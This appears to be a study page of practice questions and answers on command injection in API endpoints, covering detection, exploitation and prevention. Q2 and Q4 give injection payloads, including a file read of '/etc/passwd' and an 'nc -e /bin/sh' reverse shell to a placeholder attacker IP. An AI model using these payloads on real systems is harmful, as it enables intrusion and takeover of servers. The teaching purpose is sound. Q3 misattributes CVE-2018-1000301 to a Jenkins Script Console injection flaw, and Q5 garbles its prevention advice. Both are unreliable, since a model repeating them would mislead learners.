---
course: API Security
topic: Command Injection
tags: [api-security]
---

## Practice Questions & Answers

**Q1. Explain what command injection is and how it can occur in an API endpoint.**

Command injection is a type of security vulnerability where an attacker can inject malicious commands into an application through input fields or parameters. This occurs when an application takes untrusted input and uses it to construct a command string that is executed by the underlying operating system. In the context of an API endpoint, if the endpoint accepts user input and passes it directly to a command execution function without proper sanitization, an attacker can inject additional commands that the server will execute. This can lead to unauthorized access, data theft, or complete control over the server.

**Q2. How can you identify if an API endpoint is vulnerable to command injection?**

To identify if an API endpoint is vulnerable to command injection, you should look for endpoints that accept user input and potentially execute it as a command. One common method is to test the endpoint with special characters or commands that are known to trigger command execution. For example, you can try appending `;id` or `|id` to the input field. If the response includes the output of the `id` command, the endpoint is likely vulnerable to command injection. Another approach is to monitor the network traffic using tools like Burp Suite to see if the input is being passed directly to a command execution function.

**Q3. Describe a recent real-world example of a command injection attack and explain how it was exploited.**

A notable example of a command injection attack occurred in the Jenkins CI/CD platform. In 2018, a vulnerability (CVE-2018-1000301) was discovered where attackers could exploit a command injection flaw in the Jenkins Script Console feature. The Script Console allowed authenticated users to run Groovy scripts on the server. An attacker could inject arbitrary shell commands via the Groovy script, leading to remote code execution. To exploit this, an attacker would craft a malicious Groovy script that included shell commands, such as `Runtime.getRuntime().exec("id")`, which would execute the `id` command on the server. This allowed the attacker to gain unauthorized access and potentially take full control of the Jenkins instance.

**Q4. How would you exploit a command injection vulnerability in an API endpoint that accepts a username parameter?**

To exploit a command injection vulnerability in an API endpoint that accepts a username parameter, you would first need to determine if the endpoint is vulnerable by injecting special characters or commands. For example, you might try appending `;id` or `|id` to the username parameter. If the endpoint returns the output of the `id` command, it indicates a vulnerability. To exploit this further, you could inject more complex commands, such as `;cat /etc/passwd` to read sensitive files, or `;nc -e /bin/sh <attacker IP> <port>` to establish a reverse shell. Here’s an example payload:

```plaintext
username=test;cat /etc/passwd
```

This payload would cause the server to execute the `cat /etc/passwd` command, revealing the contents of the `/etc/passwd` file.

**Q5. What steps can be taken to prevent command injection vulnerabilities in API endpoints?**

To prevent command injection vulnerabilities in API endpoints, several steps can be taken:

1. **Input Validation:** Ensure that all user inputs are validated and sanitized before being used in command execution. Use whitelisting to allow only expected characters and patterns.

2. **Use Parameterized Queries:** When constructing commands, use parameterized queries or prepared statements to separate user input from the command logic. This prevents attackers from injecting arbitrary commands.

3. **Least Privilege Principle:** Run the application with the least privileges necessary. This limits the potential damage an attacker can cause even if a command injection vulnerability is exploited.

4. **Security Testing:** Regularly perform security testing, including penetration testing and code reviews, to identify and fix vulnerabilities before they can be exploited.

5. **Update Dependencies:** Keep all dependencies and libraries up to date to ensure that known vulnerabilities are patched.

By implementing these measures, you can significantly reduce the risk of command injection attacks in your API endpoints.

---
<!-- nav -->
[[API Security/13-Command Injection/02-Command Injection/02-Command Injection|Command Injection]] | [[API Security/13-Command Injection/02-Command Injection/00-Overview|Overview]]
